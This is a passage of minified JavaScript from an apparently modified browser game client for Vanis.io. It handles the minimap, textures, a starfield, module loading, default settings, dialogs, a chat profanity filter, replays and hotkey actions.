            (t.font = "14px Nunito"),
            (t.textAlign = "center"),
            (t.textBaseline = "middle"),
            (t.fillStyle = "#3f3f3f"),
            (this.locations = []);
          let i = l / s,
            a = i / 2;
          for (let n = 0; n < s; n++) {
            let o = n * i + a;
            for (let r = 0; r < s; r++) {
              let c = r * i + a,
                h = String.fromCharCode(97 + r).toUpperCase() + (n + 1);
              t.strokeText(h, o, c),
                t.fillText(h, o, c),
                this.locations.push({ c: h, x: o, y: c });
            }
          }
        },
        drawLocations(t) {
          t.width = t.height = l;
          let s = t.getContext("2d");
          this.drawLocationGrid(s, 5), this.drawLocationCodes(s, 5);
        },
        closestSector() {
          if (!this.lastKnownChild) return;
          let t,
            s = 1 / 0;
          for (let i of this.locations) {
            let a = p(this.lastKnownChild, i);
            a < s && ((t = i), (s = a));
          }
          return t?.c;
        },
      },
      created() {
        (a.minimap = this),
          a.events.$on("minimap-show", this.onMinimapShow),
          a.events.$on("minimap-hide", this.onMinimapHide),
          a.events.$on("minimap-destroy", this.destroyMinimap),
          a.events.$on("minimap-create-node", this.createNode),
          a.events.$on("minimap-destroy-node", this.destroyNode),
          a.events.$on("minimap-show-locations", (t) => {
            this.showLocations = t;
          }),
          a.events.$on("minimap-stats-visible", (t) => {
            this.showMinimapStats = t;
          }),
          a.events.$on("restart-timing-changed", (t) => {
            (this.currentTick = t.currentTick),
              (this.restartTick = t.restartTick);
          }),
          a.events.$on("crown-ownership-changed", (t) => {
            this.crownHolder = t;
          }),
          a.events.$on("minimap-stats-changed", (t) => {
            (this.spectators = t.spectators),
              (this.playerCount = t.playerCount);
          }),
          a.events.$on("minimap-stats-invalidate-shown", () => {
            (this.showClock = n.showClock),
              (this.showSessionTime = n.showSessionTime),
              (this.showSpectators = n.showSpectators),
              (this.showPlayerCount = n.showPlayerCount),
              (this.showRestartTiming = n.showRestartTiming),
              (this.showCrownHolder = n.showCrownHolder);
          }),
          a.events.$on("game-stopped", () => {
            (this.crownHolder = null),
              (this.currentTick = 0),
              (this.restartTick = 0);
          }),
          a.events.$on("server-tick", () => {
            this.currentTick++;
          });
      },
      mounted() {
        this.drawLocations(this.$refs.locations),
          this.initRenderer(this.$refs.minimap),
          (this.startTime = Date.now()),
          a.events.$on("every-second", () => {
            this.systemTime = d();
            let t = (Date.now() - this.startTime) / 1e3;
            (this.sessionTime = u(t)),
              this.restartTick && this.currentTick
                ? ((t = (this.restartTick - this.currentTick) / 25),
                  (this.restartTime = u(t, !0)))
                : (this.restartTime = null);
          });
      },
    };
  }),
  (imports.TextureManager = function (t, s, i) {
    let a = i(4),
      n = i(63);
    class o {
      constructor(t) {
        (this.circle = t),
          (this.cache = new Map()),
          (this.textureSize = a.cellSize),
          (this.cellSize = this.textureSize / 2);
      }
      getCircle(t) {
        if (this.cache.has(t)) return this.cache.get(t);
        {
          let s = this.cellSize,
            i = new PIXI.Graphics().beginFill(t).drawCircle(0, 0, s).endFill();
          i.position.set(s);
          let a = PIXI.RenderTexture.create(this.textureSize, this.textureSize);
          return this.cache.set(t, a), n.render(i, a), a;
        }
      }
      getSquare(t) {
        if (this.cache.has(t)) return this.cache.get(t);
        {
          let s = this.cellSize,
            i = new PIXI.Graphics()
              .beginFill(t)
              .drawRect(-s, -s, 2 * s, 2 * s)
              .endFill();
          i.position.set(s);
          let a = PIXI.RenderTexture.create(this.textureSize, this.textureSize);
          return this.cache.set(t, a), n.render(i, a), a;
        }
      }
      getTexture(t) {
        return this.circle ? this.getCircle(t) : this.getSquare(t);
      }
      clearCache() {
        for (let t of this.cache.values()) t.destroy(!0);
        this.cache.clear();
      }
    }
    t.exports = o;
  }),
  (imports.Starfield = function (t, s, i) {
    let a = i(1),
      n = document.createElement("canvas"),
      o = n.getContext("2d"),
      r,
      l,
      c,
      h,
      d = () => {
        (r = n.width = window.innerWidth),
          (l = n.height = window.innerHeight),
          (c = r / 2),
          (h = l / 2);
      };
    window.addEventListener("resize", d), d();
    let u = () => {
        let t = r,
          s = l;
        return { x: Math.random() * t * 2 - t, y: Math.random() * s * 2 - s };
      },
      p = (t) => {
        let s = c + t.radius,
          i = h + t.radius;
        return t.x < -s || t.x > s || t.y < -i || t.y > i;
      };
    class g {
      spawn({ x: t, y: s }) {
        (this.x = t),
          (this.y = s),
          (this.angle = Math.atan2(s, t)),
          (this.radius = 0.1),
          (this.speed = 0.4 + 3.3 * Math.random());
      }
      update(t) {
        let s = this.speed * t;
        (this.x += Math.cos(this.angle) * s),
          (this.y += Math.sin(this.angle) * s),
          (this.radius += 0.0035 * s);
      }
    }
    let m = new Set();
    for (let A = 0; A < 300; A++) m.add(new g());
    let f = !1,
      C = (t) => {
        for (let s of (o.beginPath(),
        (o.fillStyle = "#808080"),
        (o.globalAlpha = 0.9),
        m))
          (f || p(s)) && s.spawn(u()),
            s.update(t),
            o.moveTo(s.x, s.y),
            o.arc(s.x, s.y, s.radius, 0, 2 * Math.PI);
        o.fill(), (f = !1);
      },
      v,
      w,
      I = (t) => {
        if (a.running) {
          window.removeEventListener("resize", d), n.parentNode?.removeChild(n);
          return;
        }
        let s = performance.now();
        v || (v = w = s), (t = (s - w) / 6);
        let i = s - v - 550;
        if (i > 0) {
          let u = Math.min(i / 1e3, 1.2);
          t /= Math.pow(3, u);
        }
        requestAnimationFrame(I),
          o.clearRect(0, 0, r, l),
          o.save(),
          o.translate(c, h),
          C(t),
          o.restore(),
          (w = s);
      },
      $ = (t) => {
        (f = !0),
          (v = v = null),
          o.clearRect(0, 0, r, l),
          document.getElementById("overlay").prepend(n),
          setTimeout(I, t || 3e3);
      };
    a.events.$on("game-stopped", $), $(!0);
  });
const clientVersion = "2.0.2.0",
  parseVersion = (t) => {
    (t && "string" == typeof t) || (t = clientVersion);
    let s = t.match(/\d*!.|\d+/g);
    return {
      development: "1" === s[3],
      build: Number(s.slice(0, 3).join("")),
      string: s.slice(0, 3).join("."),
    };
  },
  setStatus = (...t) =>
    console.log(
      "%cAxon client%c",
      "background-color:#101010;color:#adadad;font-weight:700;border-radius:4px;padding:4px",
      "",
      ...t
    ),
  atob = (t) => {
    if (
      ((t = (t = `${t}`).replace(/[ \t\n\f\r]/g, "")).length % 4 == 0 &&
        (t = t.replace(/==?$/, "")),
      t.length % 4 == 1 || /[^+/0-9A-Za-z]/.test(t))
    )
      return null;
    let s = "",
      i = 0,
      a = 0;
    for (let n = 0; n < t.length; n++)
      (i <<= 6),
        (i |= lookupCharacter(t[n])),
        24 === (a += 6) &&
          ((s += String.fromCharCode((16711680 & i) >> 16)),
          (s += String.fromCharCode((65280 & i) >> 8)),
          (s += String.fromCharCode(255 & i)),
          (i = a = 0));
    return (
      12 === a
        ? ((i >>= 4), (s += String.fromCharCode(i)))
        : 18 === a &&
          ((i >>= 2),
          (s += String.fromCharCode((65280 & i) >> 8)),
          (s += String.fromCharCode(255 & i))),
      s
    );
  },
  keyString =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
  lookupCharacter = (t) => {
    let s = keyString.indexOf(t);
    return s < 0 ? void 0 : s;
  };
!(function (t) {
  function s(s) {
    let a = s[0],
      r = s[1],
      l = s[2],
      c = [];
    for (let h of a) n[h] && c.push(n[h][0]), (n[h] = 0);
    for (let u in r)
      Object.prototype.hasOwnProperty.call(r, u) && (t[u] = r[u]);
    for (d && d(s); c.length; ) c.shift()();
    return o.push.apply(o, l || []), i();
  }
  function i() {
    let t;
    for (let s = 0; s < o.length; s++) {
      let i = o[s],
        a = !0;
      for (let l = 1; l < i.length; l++) {
        let c = i[l];
        0 !== n[c] && (a = !1);
      }
      a && (o.splice(s--, 1), (t = r((r.s = i[0]))));
    }
    return t;
  }
  let a = {},
    n = { 0: 0 },
    o = [];
  function r(s) {
    if (a[s]) return a[s].exports;
    {
      let i = (a[s] = { i: s, l: !1, exports: {} });
      return t[s].call(i.exports, i, i.exports, r), (i.l = !0), i.exports;
    }
  }
  (r.m = t),
    (r.c = a),
    (r.d = function (t, s, i) {
      r.o(t, s) || Object.defineProperty(t, s, { enumerable: !0, get: i });
    }),
    (r.r = function (t) {
      "undefined" != typeof Symbol &&
        Symbol.toStringTag &&
        Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }),
        Object.defineProperty(t, "__esModule", { value: !0 });
    }),
    (r.t = function (t, s) {
      if ((1 & s && (t = r(t)), 8 & s)) return t;
      {
        if (4 & s && "object" == typeof t && t && t.__esModule) return t;
        let i = Object.create(null);
        if (
          (r.r(i),
          Object.defineProperty(i, "default", { enumerable: !0, value: t }),
          2 & s && "string" != typeof t)
        )
          for (let a in t)
            r.d(
              i,
              a,
              function (s) {
                return t[s];
              }.bind(null, a)
            );
        return i;
      }
    }),
    (r.n = function (t) {
      let s = t && t.__esModule ? () => t.default : () => t;
      return r.d(s, "a", s), s;
    }),
    (r.o = (t, s) => Object.prototype.hasOwnProperty.call(t, s)),
    (r.p = "");
  let l = (window.webpackJsonp = window.webpackJsonp || []);
  var c = l.push.bind(l);
  for (let h of ((l.push = s), (l = l.slice()))) s(h);
  var d = c;
  o.push([115, 1]), i();
})([
  ,
  imports.Game,
  ,
  ,
  function (t, s) {
    let i = {
      useWebGL: !0,
      gameResolution: 1,
      smallTextThreshold: 40,
      autoZoom: !1,
      autoRespawn: !1,
      mouseFreezeSoft: !0,
      drawDelay: 120,
      movementDelay: 40,
      cameraMoveSmoothing: 0.18,
      cameraZoomSmoothing: 0.14,
      cameraZoomSpeed: 10,
      replayDuration: 8,
      showNames: 2,
      showMass: 2,
      showSkins: 1,
      showOwnName: !0,
      showOwnMass: !0,
      showOwnSkin: !0,
      showCrown: !0,
      foodVisible: !0,
      eatAnimation: !0,
      showVirusEjecText: !1,
      showHud: !0,
      showLeaderboard: !0,
      showServerName: !1,
      showChat: !0,
      minimapEnabled: !0,
      minimapLocations: !0,
      showPlayerList: !1,
      listServerBots: !1,
      showFPS: !0,
      showPing: !0,
      showCellCount: !0,
      showPlayerScore: !1,
      showPlayerMass: !0,
      showMinionMass: !0,
      showMinionCellCount: !0,
      showClock: !1,
      showSessionTime: !1,
      showPlayerCount: !1,
      showSpectators: !1,
      showRestartTiming: !1,
      showCrownHolder: !1,
      showBlockedMessageCount: !0,
      filterChatMessages: !0,
      clearChatMessages: !0,
      chatBypass: !1,
      showColoredNames: !0,
      showHats: !0,
      showOwnColoredName: !0,
      showOwnHat: !0,
      chatOnIdle: !1,
      idleTime: 10,
      backgroundColor: "101010",
      borderColor: "151515",
      foodColor: "ffffff",
      ejectedColor: "2d70eb",
      cellNameOutlineColor: "000000",
      ownCellColor: "2d82d2",
      solidCellColor: "2d82d2",
      cursorImageUrl: null,
      backgroundImageUrl: "img/background.png",
      virusImageUrl: "img/virus.png",
      cellMassColor: "ffffff",
      cellMassOutlineColor: "000000",
      cellNameFont: "Hind Madurai",
      cellNameWeight: 1,
      cellNameOutline: 2,
      cellNameSmoothOutline: !0,
      cellLongNameThreshold: 750,
      cellMassFont: "Ubuntu",
      cellMassWeight: 2,
      cellMassOutline: 2,
      cellMassTextSize: 0,
      cellMassSmoothOutline: !0,
      shortMass: !0,
      showBackgroundImage: !0,
      backgroundImageRepeat: !0,
      backgroundDefaultIfUnequal: !0,
      backgroundImageOpacity: 0.6,
      useFoodColor: !1,
      useOwnCellColor: !1,
      useSolidCellColor: !1,
      rainbowEjectedMass: !1,
      animateEjectedCells: !1,
      legacyLinesplit: !0,
      namesEnabled: !0,
      skinsEnabled: !0,
      massEnabled: !0,
      showLocations: !1,
      cellBorderSize: 1,
      autoHideReplayControls: !1,
      minimapSize: 220,
      minimapFPS: 60,
      minimapSmoothing: 0.08,
      enableMinion: !1,
      autoSpectate: !1,
      minionAutoRespawn: !1,
      minionNickname: "",
      minionTeamTag: "",
      minionSkinUrl: "https://skins.vanis.io/s/vanis1",
      minionUseToken: !1,
      antiAfk: !1,
      rotateSkins: !1,
      autoReconnect: !1,
      respawnDelay: 1500,
    };
    function a(t) {
      switch (t) {
        case 2:
          return "bold";
        case 0:
          return "thin";
        default:
          return "normal";
      }
    }
    function n(t, s) {
      var i;
      switch (t) {
        case 3:
          i = s / 5;
          break;
        case 1:
          i = s / 20;
          break;
        default:
          i = s / 10;
      }
      return Math.ceil(i);
    }
    t.exports = window.settings = new (class t {
      constructor() {
        this.getInternalSettings(),
          (this.userDefinedSettings = this.loadUserDefinedSettings()),
          Object.assign(this, i, this.userDefinedSettings),
          this.set("skinsEnabled", !0),
          this.set("namesEnabled", !0),
          this.set("massEnabled", !0),
          this.compileNameFontStyle(),
          this.compileMassFontStyle();
      }
      getInternalSettings() {
        (this.cellSize = 512),
          (this.cellNamePadding = 350),
          (this.cellRenderSize = this.cellSize + this.cellNamePadding),
          (this.cellScaleRatio = this.cellRenderSize / this.cellSize);
      }
      compileNameFontStyle() {
        let t = {
          fontFamily: this.cellNameFont,
          fontSize: 80,
          fontWeight: a(this.cellNameWeight),
        };
        return (
          this.cellNameOutline &&
            ((t.stroke = PIXI.utils.string2hex(this.cellNameOutlineColor)),
            (t.strokeThickness = n(this.cellNameOutline, t.fontSize)),
            (t.lineJoin = this.cellNameSmoothOutline ? "round" : "miter")),
          (this.nameTextStyle = t),
          t
        );
      }
      compileMassFontStyle() {
        let t = {
          fontFamily: this.cellMassFont,
          fontSize: 56 + 20 * this.cellMassTextSize,
          fontWeight: a(this.cellMassWeight),
          lineJoin: "round",
          fill: PIXI.utils.string2hex(this.cellMassColor),
        };
        return (
          this.cellMassOutline &&
            ((t.stroke = PIXI.utils.string2hex(this.cellMassOutlineColor)),
            (t.strokeThickness = n(this.cellMassOutline, t.fontSize)),
            (t.lineJoin = this.cellMassSmoothOutline ? "round" : "miter")),
          (this.massTextStyle = t),
          t
        );
      }
      loadUserDefinedSettings() {
        return JSON.parse(localStorage.getItem("settings")) || {};
      }
      getDefault(t) {
        return i[t];
      }
      set(t, s) {
        if (this[t] !== s)
          return (
            (this[t] = s),
            (this.userDefinedSettings[t] = s),
            (localStorage.settings = JSON.stringify(this.userDefinedSettings)),
            !0
          );
      }
    })();
  },
  function (t, s, i) {
    let a = (window.Swal = i(267).default),
      n = a.mixin({
        toast: !0,
        position: "top",
        showConfirmButton: !1,
        showCloseButton: !0,
      }),
      o = a.mixin({
        toast: !0,
        position: "bottom",
        showConfirmButton: !1,
        showCloseButton: !0,
        animation: !1,
      });
    t.exports = {
      toast: n,
      ltoast: o,
      fire: a.fire.bind(a),
      alert(t) {
        n.fire({ title: t, confirmButtonText: "Okay", timer: 5e3 });
      },
      confirm(t, s, i) {
        let n = {
          title: i || "",
          text: t,
          showCancelButton: !0,
          confirmButtonText: "Continue",
        };
        a.fire(n).then((t) => {
          t.value && s();
        });
      },
      html(t, s, i) {
        let n = {
          title: t,
          html: s,
          type: i,
          showCloseButton: !0,
          confirmButtonText: "Okay",
        };
        a.fire(n);
      },
      instance: a,
    };
  },
  ,
  ,
  function (t) {
    var s = !1;
    t.exports = {
      lerp: (t, s, i) => (1 - i) * t + i * s,
      clampNumber: (t, s, i) => Math.min(i, Math.max(s, t)),
      getTimeString: function (t, s, i) {
        t instanceof Date && (t = t.getTime());
        var a = s ? 1 : 1e3,
          n = 60 * a,
          o = 60 * n;
        if (t < a) return "1 second";
        for (
          var r = [24 * o, o, n, a],
            l = ["day", "hour", "minute", "second"],
            c = !1,
            h = [],
            d = 0;
          d < r.length;
          d++
        ) {
          var u = r[d],
            p = Math.floor(t / u);
          if (p) {
            var g = l[d],
              m = p > 1 ? "s" : "";
            h.push(p + " " + g + m), (t %= u);
          }
          if (c) break;
          p && !i && (c = !0);
        }
        return h.join(", ");
      },
      encodeHTML: (t) =>
        t
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/'/g, "&apos;")
          .replace(/"/g, "&quot;"),
      getTimestamp: function () {
        var t = new Date(),
          s = t.getMonth() + 1,
          i = t.getDate();
        return (
          [
            t.getFullYear(),
            (s > 9 ? "" : "0") + s,
            (i > 9 ? "" : "0") + i,
          ].join("") +
          "-" +
          [
            ("0" + t.getHours()).slice(-2),
            ("0" + t.getMinutes()).slice(-2),
            ("0" + t.getSeconds()).slice(-2),
          ].join("")
        );
      },
      loadImage: (t) =>
        fetch(t, { mode: "cors" })
          .then((t) => t.blob())
          .then((t) => createImageBitmap(t)),
      hideCaptchaBadge() {
        s || (document.body.classList.add("hide-captcha-badge"), (s = !0));
      },
      destroyPixiPlugins: function (t) {
        ["interaction", "accessibility"].forEach((s) => {
          var i = t.plugins[s];
          i && (i.destroy(), delete t.plugins[s]);
        });
      },
    };
  },
  ,
  ,
  ,
  function (t, s, i) {
    let a = i(120),
      n = i(121);
    t.exports = { cells: new a(!0), squares: new a(!1), virus: n };
  },
  ,
  imports.Cell,
  ,
  ,
  ,
  function (t, s, i) {
    var a = i(5);
    function n() {
      a.instance.fire({
        type: "warning",
        title: "Browser Unsupported",
        html: "Skins might not work properly in this browser.<br>Please consider using Google Chrome for optimized gameplay.",
        allowOutsideClick: !1,
      });
    }
    function o(t) {
      for (var s = "", i = 0; i < t.length; i++)
        s += String.fromCharCode(t.charCodeAt(i) - 2);
      return s;
    }
    var r = [
        "pkiigt",
        "p3iigt",
        "pkii5t",
        "pkiic",
        "p3iic",
        "p3ii6",
        "pkii",
        "p3ii",
        "pki",
        "p3i",
        "hciiqv",
        "h6iiqv",
        "hcii2v",
        "hci",
        "cpcn",
        "cuujqng",
        "ewpv",
        "rwuu{",
        "xcikpc",
        "xci3pc",
        "eqem",
        "e2em",
        "yjqtg",
        "yj2tg",
        "unwv",
        "dkvej",
        "d3vej",
        "rqtp",
        "r2tp",
        "tcrg",
        "t6rg",
        "jkvngt",
        "j3vngt",
        "jkvn5t",
        "j3vn5t",
        "pc|k",
        "p6|k",
        "tgvctf",
        "ejkpm",
      ],
      l = r.map(o),
      c = r
        .map(o)
        .sort((t, s) => s.length - t.length)
        .map((t) => ({
          regex: RegExp(t.split("").join("s*"), "gi"),
          replacement: Array(t.length).fill("*").join(""),
        }));
    t.exports = {
      noop() {},
      checkBadWords: function (t) {
        return (t = t.toLowerCase()), l.some((s) => t.includes(s));
      },
      replaceBadWordsChat: function (t) {
        for (var s of c) t = t.replace(s.regex, s.replacement);
        return t;
      },
      notifyUnsupportedBrowser: async function () {
        window.safari ||
        /^((?!chrome|android).)*safari/i.test(navigator.userAgent)
          ? a.instance.fire({
              type: "warning",
              title: "Safari browser is not supported :(",
              html: "Please consider using Google Chrome.",
              allowOutsideClick: !1,
              showCloseButton: !1,
              showCancelButton: !1,
              showConfirmButton: !1,
            })
          : localStorage.skipUnsupportedAlert ||
            ((localStorage.skipUnsupportedAlert = !0),
            navigator.userAgent.toLowerCase().includes("edge")
              ? n()
              : (await new Promise((t) => {
                  var s = new Image();
                  (s.src =
                    "data:image/webp;base64,UklGRjoAAABXRUJQVlA4IC4AAACyAgCdASoCAAIALmk0mk0iIiIiIgBoSygABc6WWgAA/veff/0PP8bA//LwYAAA"),
                    (s.onload = s.onerror =
                      () => {
                        t(2 === s.height);
                      });
                })) || n());
      },
    };
  },
  ,
  ,
  ,
  ,
  ,
  function (t, s) {},
  ,
  ,
  ,
  function (t, s, i) {
    var a = i(2),
      n = i(167);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    "use strict";
    let a = i(30),
      n = i.n(a);
    s.default = n.a;
  },
  function (t, s) {
    t.exports = { data: () => ({}) };
  },
  function (t, s, i) {
    let a = i(2),
      n = i(169);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[e.i, n, ""]]),
      a(n, { insert: "head", singleton: !1 }),
      (t.exports = n.locals ? n.locals : {});
  },
  function (t, s, i) {
    let a = i(2),
      n = i(171);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[e.i, n, ""]]),
      a(n, { insert: "head", singleton: !1 }),
      (t.exports = n.locals ? n.locals : {});
  },
  function (t, s, i) {
    var a = i(2),
      n = i(173);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(175);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(177);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(179);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    "use strict";
    var a = i(38),
      n = i.n(a);
    s.default = n.a;
  },
  function (t, s, i) {
    var a = i(86),
      n = i(1),
      o = i(5),
      r = n.replay.database;
    t.exports = {
      props: ["replay"],
      created: function () {},
      methods: {
        play(t) {
          n.connection.active
            ? o.confirm(
                "You will be disconnected from current game before replay",
                this._play.bind(this, t)
              )
            : this._play(t);
        },
        _play(t) {
          try {
            n.replay.play(t);
          } catch (s) {
            o.alert("Replay data is corrupted!"),
              console.warn("Replay data possibly corrupt, error:", s);
          }
        },
        downloadReplay(t) {
          o.instance
            .fire({
              input: "text",
              inputValue: t.name,
              showCancelButton: !0,
              confirmButtonText: "Download",
              html: "This file is not a video file and only Vanis.io website can play it.<br>File consists of player positions and other game related data.",
            })
            .then((s) => {
              var i = s.value;
              if (i) {
                var n = new Blob([t.data], {
                  type: "text/plain;charset=utf-8",
                });
                a.saveAs(n, i + ".vanis");
              }
            });
        },
        deleteReplay(t) {
          o.confirm("Are you sure that you want to delete this replay?", () => {
            r.removeItem(t, () => {
              n.events.$emit("replay-removed");
            });
          });
        },
      },
    };
  },
  function (t, s, i) {
    var a = i(2),
      n = i(219);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(221);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(223);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(225);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(227);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(231);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(233);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(235);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(237);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(239);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(241);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(243);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(245);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(247);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(249);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    "use strict";
    var a = i(55),
      n = i.n(a);
    s.default = n.a;
  },
  imports.Minimap,
  function (t, s, i) {
    var a = i(2),
      n = i(251);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(253);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(255);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(257);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(259);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(261);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    var a = i(2),
      n = i(263);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {
    let a = i(4),
      n = i(8),
      o = document.getElementById("canvas"),
      r = {
        resolution: a.gameResolution || window.devicePixelRatio || 1,
        view: o,
        forceCanvas: !a.useWebGL,
        powerPreference: "high-performance",
      },
      l = PIXI.autoDetectRenderer(r),
      c = () => l.resize(window.innerWidth, window.innerHeight);
    c(),
      window.addEventListener("resize", c),
      n.destroyPixiPlugins(l),
      l.clear(),
      (t.exports = l);
  },
  ,
  function (t, s, i) {
    var a = i(1),
      n = i(5),
      o = {
        toggleAutoRespawn: function () {
          let t = a.settings.autoRespawn;
          a.settings.set("autoRespawn", !t),
            a.state.isAutoRespawning && a.triggerAutoRespawn(),
            n.toast.fire({
              type: "info",
              title: `Auto respawn ${t ? "disabled" : "enabled"}`,
              timer: 1500,
            });
        },
        toggleAutoSpectate: function () {
          let t = a.settings.autoSpectate;
          a.settings.set("autoSpectate", !t),
            n.toast.fire({
              type: "info",
              title: `Auto spectate ${t ? "disabled" : "enabled"}`,
              timer: 1500,
            });
        },
        respawn: function () {
          a.state.deathScreen || (a.actions.spawn(), a.showMenu(!1));
        },
        contextMenu() {
          var t = a.actions.findPlayerUnderMouse();
          t && a.events.$emit("context-menu", t.player);
        },
        feed: a.actions.feed.bind(null),
        feedMacro: a.actions.feed.bind(null, !0),
        split: a.actions.split.bind(null, 1),
        splitx2: a.actions.split.bind(
          null,
          2,
          a.settings.delayDoublesplit ? 40 : 0
        ),
        splitx3: a.actions.split.bind(null, 3),
        splitMax: a.actions.split.bind(null, 4),
        split32: a.actions.split.bind(null, 5),
        split64: a.actions.split.bind(null, 6),
        split128: a.actions.split.bind(null, 7),
        split256: a.actions.split.bind(null, 8),
        linesplit: a.actions.linesplit,
        freezeMouse: a.actions.freezeMouse,
        lockMouse: a.actions.lockMouse,
        lockLinesplit: a.actions.lockLinesplit,
        stopMovement: a.actions.stopMovement,
        toggleSkins: a.actions.toggleSkins,
